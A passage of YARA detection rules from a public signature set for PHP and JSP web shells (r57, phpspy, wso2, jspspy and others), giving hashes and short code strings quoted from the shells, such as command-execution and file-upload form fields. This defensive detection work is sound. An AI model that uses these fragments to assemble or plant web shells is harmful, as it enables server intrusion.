		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, download.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2072-L2091"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "3605e1304fb314c13d6c94d6ac9337731c6ee4fef679444d599cb3ae29023b56"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash4 = "fa87bbd7201021c1aefee6fcc5b8e25a"

	strings:
		$s2 = "<small>jsp File Browser version <%= VERSION_NR%> by <a"
		$s3 = "else if (fName.endsWith(\".mpg\") || fName.endsWith(\".mpeg\") || fName.endsWith"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Itsec_Itsecteam_Shell_Jhn {
    meta:
		description = "Web Shell - from files itsec.php, itsecteam_shell.php, jHn.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2092-L2109"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "2775d7e47a26e06ea716bdca32a0f768eccf4d269caa3d107b4a78f8684ce741"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "8ae9d2b50dc382f0571cd7492f079836"
		hash1 = "bd6d3b2763c705a01cc2b3f105a25fa4"
		hash2 = "40c6ecf77253e805ace85f119fe1cebb"

	strings:
		$s4 = "echo $head.\"<font face='Tahoma' size='2'>Operating System : \".php_uname().\"<b"
		$s5 = "echo \"<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Ghost_Source_Icesword_Silic {
    meta:
		description = "Web Shell - from files ghost_source.php, icesword.php, silic.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2110-L2127"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "22879d5279866e3c25a5b41a98b44595f191cfcac6489208b0bdb6b7ca7201e5"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "cbf64a56306c1b5d98898468fc1fdbd8"
		hash1 = "6e20b41c040efb453d57780025a292ae"
		hash2 = "437d30c94f8eef92dc2f064de4998695"

	strings:
		$s3 = "if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $"
		$s6 = "if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST["

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jspspy_Jspspyjdk5_Jspspyjdk51_Luci_Jsp_Spy2009_M_Ma3_Xxx {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2128-L2171"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "6c61e5ccd4800f0cfd20532ab43f917f39a7367cc09cbe92e5320eb2c97fabf3"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash4 = "8b457934da3821ba58b06a113e0d53d9"
		hash5 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash6 = "14e9688c86b454ed48171a9d4f48ace8"
		hash7 = "b330a6c2d49124ef0729539761d6ef0b"
		hash8 = "d71716df5042880ef84427acee8b121e"
		hash9 = "341298482cf90febebb8616426080d1d"
		hash10 = "29aebe333d6332f0ebc2258def94d57e"
		hash11 = "42654af68e5d4ea217e6ece5389eb302"
		hash12 = "88fc87e7c58249a398efd5ceae636073"
		hash13 = "4a812678308475c64132a9b56254edbc"
		hash14 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash15 = "344f9073576a066142b2023629539ebd"
		hash16 = "32dea47d9c13f9000c4c807561341bee"
		hash17 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash18 = "655722eaa6c646437c8ae93daac46ae0"
		hash19 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash20 = "9c94637f76e68487fa33f7b0030dd932"
		hash21 = "6acc82544be056580c3a1caaa4999956"
		hash22 = "6aa32a6392840e161a018f3907a86968"
		hash23 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash24 = "3ea688e3439a1f56b16694667938316d"
		hash25 = "ab77e4d1006259d7cbc15884416ca88c"
		hash26 = "71097537a91fac6b01f46f66ee2d7749"
		hash27 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash28 = "7a4b090619ecce6f7bd838fe5c58554b"

	strings:
		$s8 = "\"<form action=\\\"\"+SHELL_NAME+\"?o=upload\\\" method=\\\"POST\\\" enctype="
		$s9 = "<option value='reg query \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\T"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_2_520_Job_Ma1_Ma4_2 {
    meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2172-L2192"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "db76ff42079b20d9e5c40661d7b30206e6bffc828f55daa4dc210662068f8e27"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "56c005690da2558690c4aa305a31ad37"
		hash3 = "532b93e02cddfbb548ce5938fe2f5559"
		hash4 = "6e0fa491d620d4af4b67bae9162844ae"
		hash5 = "7eabe0f60975c0c73d625b7ddf7b9cbd"

	strings:
		$s4 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" "
		$s9 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getR"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_000_403_807_A_C5_Config_Css_Dm_He1P_Jspspy_Jspspyjdk5_Jspspyjdk51_Luci_Jsp_Xxx {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2193-L2239"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "cda47d7967b0f4b2a274ff2196d27d2e108b00917812093bbb3f033a8a1d1c3c"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash4 = "8b457934da3821ba58b06a113e0d53d9"
		hash5 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash6 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash7 = "14e9688c86b454ed48171a9d4f48ace8"
		hash8 = "b330a6c2d49124ef0729539761d6ef0b"
		hash9 = "d71716df5042880ef84427acee8b121e"
		hash10 = "341298482cf90febebb8616426080d1d"
		hash11 = "29aebe333d6332f0ebc2258def94d57e"
		hash12 = "42654af68e5d4ea217e6ece5389eb302"
		hash13 = "88fc87e7c58249a398efd5ceae636073"
		hash14 = "4a812678308475c64132a9b56254edbc"
		hash15 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash16 = "e0354099bee243702eb11df8d0e046df"
		hash17 = "344f9073576a066142b2023629539ebd"
		hash18 = "32dea47d9c13f9000c4c807561341bee"
		hash19 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash20 = "655722eaa6c646437c8ae93daac46ae0"
		hash21 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash22 = "9c94637f76e68487fa33f7b0030dd932"
		hash23 = "6acc82544be056580c3a1caaa4999956"
		hash24 = "6aa32a6392840e161a018f3907a86968"
		hash25 = "591ca89a25f06cf01e4345f98a22845c"
		hash26 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash27 = "3ea688e3439a1f56b16694667938316d"
		hash28 = "ab77e4d1006259d7cbc15884416ca88c"
		hash29 = "71097537a91fac6b01f46f66ee2d7749"
		hash30 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash31 = "7a4b090619ecce6f7bd838fe5c58554b"

	strings:
		$s0 = "ports = \"21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500\";" fullword
		$s1 = "private static class VEditPropertyInvoker extends DefaultInvoker {" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Wso2_5_1_Wso2_5_Wso2 {
    meta:
		description = "Web Shell - from files wso2.5.1.php, wso2.5.php, wso2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2240-L2257"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "f2dce52f1b8d2c33cd8478a468383a87f13712dc6e5c9050fea6ede4f0d24cc5"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "dbeecd555a2ef80615f0894027ad75dc"
		hash1 = "7c8e5d31aad28eb1f0a9a53145551e05"
		hash2 = "cbc44fb78220958f81b739b493024688"

	strings:
		$s7 = "$opt_charsets .= '<option value=\"'.$item.'\" '.($_POST['charset']==$item?'selec"
		$s8 = ".'</td><td><a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['na"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_000_403_C5_Querydong_Spyjsp2010_T00Ls {
    meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp, t00ls.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2258-L2278"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "6f507499304a7cf4d14a134a4c0781fed9a94c40fe3257a4168bacdf3910ffec"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "8b457934da3821ba58b06a113e0d53d9"
		hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash4 = "655722eaa6c646437c8ae93daac46ae0"
		hash5 = "9c94637f76e68487fa33f7b0030dd932"

	strings:
		$s8 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')"
		$s9 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\""

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_404_Data_Suiyue {
    meta:
		description = "Web Shell - from files 404.jsp, data.jsp, suiyue.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2279-L2295"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "7f4ab5dbd2a72574c5d188e14ae98e599359b2d662266fc4c3a39d3d4405c208"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "c93d5bdf5cf62fe22e299d0f2b865ea7"

	strings:
		$s3 = " sbCopy.append(\"<input type=button name=goback value=' \"+strBack[languageNo]+"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_R57Shell_R57Shell127_Sniper_SA_Shell_Egy_Spider_Shell_V2_R57_Xxx {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2296-L2321"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "04a58352202538d5446f1000c07341ea70434f00403f116233f335213687636e"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ef43fef943e9df90ddb6257950b3538f"
		hash1 = "ae025c886fbe7f9ed159f49593674832"
		hash2 = "911195a9b7c010f61b66439d9048f400"
		hash3 = "697dae78c040150daff7db751fc0c03c"
		hash4 = "513b7be8bd0595c377283a7c87b44b2e"
		hash5 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash6 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash7 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash8 = "41af6fd253648885c7ad2ed524e0692d"
		hash9 = "6fcc283470465eed4870bcc3e2d7f14d"

	strings:
		$s2 = "echo sr(15,\"<b>\".$lang[$language.'_text58'].$arrow.\"</b>\",in('text','mk_name"
		$s3 = "echo sr(15,\"<b>\".$lang[$language.'_text21'].$arrow.\"</b>\",in('checkbox','nf1"
		$s9 = "echo sr(40,\"<b>\".$lang[$language.'_text26'].$arrow.\"</b>\",\"<select size="

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_807_A_Css_Dm_He1P_Jspspy_Xxx {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2322-L2360"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "eb045425a9f519dd7bf028a7795b16b89768682f5850b6a4d45f0991bfeb6431"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash1 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash2 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash3 = "14e9688c86b454ed48171a9d4f48ace8"
		hash4 = "b330a6c2d49124ef0729539761d6ef0b"
		hash5 = "d71716df5042880ef84427acee8b121e"
		hash6 = "341298482cf90febebb8616426080d1d"
		hash7 = "29aebe333d6332f0ebc2258def94d57e"
		hash8 = "42654af68e5d4ea217e6ece5389eb302"
		hash9 = "88fc87e7c58249a398efd5ceae636073"
		hash10 = "4a812678308475c64132a9b56254edbc"
		hash11 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash12 = "344f9073576a066142b2023629539ebd"
		hash13 = "32dea47d9c13f9000c4c807561341bee"
		hash14 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash15 = "6acc82544be056580c3a1caaa4999956"
		hash16 = "6aa32a6392840e161a018f3907a86968"
		hash17 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash18 = "3ea688e3439a1f56b16694667938316d"
		hash19 = "ab77e4d1006259d7cbc15884416ca88c"
		hash20 = "71097537a91fac6b01f46f66ee2d7749"
		hash21 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash22 = "7a4b090619ecce6f7bd838fe5c58554b"

	strings:
		$s1 = "\"<h2>Remote Control &raquo;</h2><input class=\\\"bt\\\" onclick=\\\"var"
		$s2 = "\"<p>Current File (import new file name and new file)<br /><input class=\\\"inpu"
		$s3 = "\"<p>Current file (fullpath)<br /><input class=\\\"input\\\" name=\\\"file\\\" i"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_201_3_Ma_Download {
    meta:
		description = "Web Shell - from files 201.jsp, 3.jsp, ma.jsp, download.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2361-L2380"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "14eccd07e7bef9d570f75fc4adc204d175dcfbb5b950bdb3e25a65d3c5bb0310"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "a7e25b8ac605753ed0c438db93f6c498"
		hash1 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash2 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash3 = "fa87bbd7201021c1aefee6fcc5b8e25a"

	strings:
		$s0 = "<input title=\"Upload selected file to the current working directory\" type=\"Su"
		$s5 = "<input title=\"Launch command in current directory\" type=\"Submit\" class=\"but"
		$s6 = "<input title=\"Delete all selected files and directories incl. subdirs\" class="

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Browser_201_3_400_In_Jfolder_Jfolder01_Jsp_Leo_Ma_Warn_Webshell_Nc_Download {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2381-L2408"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "0bf0fd37b542c9362a47180ee03ea28995b48d483f72273e472292a320a3ddee"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "36331f2c81bad763528d0ae00edf55be"
		hash4 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash5 = "8979594423b68489024447474d113894"
		hash6 = "ec482fc969d182e5440521c913bab9bd"
		hash7 = "f98d2b33cd777e160d1489afed96de39"
		hash8 = "4b4c12b3002fad88ca6346a873855209"
		hash9 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash10 = "e9a5280f77537e23da2545306f6a19ad"
		hash11 = "598eef7544935cf2139d1eada4375bb5"
		hash12 = "fa87bbd7201021c1aefee6fcc5b8e25a"

	strings:
		$s4 = "UplInfo info = UploadMonitor.getInfo(fi.clientFileName);" fullword
		$s5 = "long time = (System.currentTimeMillis() - starttime) / 1000l;" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Shell_Phpspy_2006_Arabicspy {
    meta:
		description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2409-L2426"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "bd9f1ffdbf94dd5a871fc7c3b31d2357e99265d02bfe1c836f82d251053dce7d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "40a1f840111996ff7200d18968e42cfe"
		hash2 = "e0202adff532b28ef1ba206cf95962f2"

	strings:
		$s0 = "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype"
		$s8 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"P"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_In_Jfolder_Jfolder01_Jsp_Leo_Warn {
    meta:
		description = "Web Shell - from files in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2427-L2447"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "00c3667438a688b990cf1c8bb6db52be7c6d1b36192dece4e8b07edda68f4b72"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash1 = "8979594423b68489024447474d113894"
		hash2 = "ec482fc969d182e5440521c913bab9bd"
		hash3 = "f98d2b33cd777e160d1489afed96de39"
		hash4 = "4b4c12b3002fad88ca6346a873855209"
		hash5 = "e9a5280f77537e23da2545306f6a19ad"

	strings:
		$s4 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strD"
		$s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDi"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_2_520_Icesword_Job_Ma1_Ma4_2 {
    meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2448-L2470"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "765efb4f776d9ffe5dab1b5decbb60df654e1de9ab8ae7e0437c5c8f717642b9"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
		hash3 = "56c005690da2558690c4aa305a31ad37"
		hash4 = "532b93e02cddfbb548ce5938fe2f5559"
		hash5 = "6e0fa491d620d4af4b67bae9162844ae"
		hash6 = "7eabe0f60975c0c73d625b7ddf7b9cbd"

	strings:
		$s2 = "private String[] _textFileTypes = {\"txt\", \"htm\", \"html\", \"asp\", \"jsp\","
		$s3 = "\\\" name=\\\"upFile\\\" size=\\\"8\\\" class=\\\"textbox\\\" />&nbsp;<input typ"
		$s9 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"passwor"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Phpspy_2005_Full_Phpspy_2005_Lite_PHPSPY {
    meta:
		description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, PHPSPY.php"
		author = "Florian Roth (Nextron Systems)"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2471-L2489"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "80c8e7b50aea91284a25ffd3a07d8705c24b6a95a58f42ec6043ececcff32dbb"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash1 = "42f211cec8032eb0881e87ebdb3d7224"
		hash2 = "0712e3dc262b4e1f98ed25760b206836"

	strings:
		$s6 = "<input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['comma"
		$s7 = "echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILE"
		$s8 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; "

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Shell_Phpspy_2006_Arabicspy_Hkrkoz {
    meta:
		description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2490-L2507"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "228e0a73f14da2957f75ae898fdbcf2386deb366df6ddc312162ab723bac44ba"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
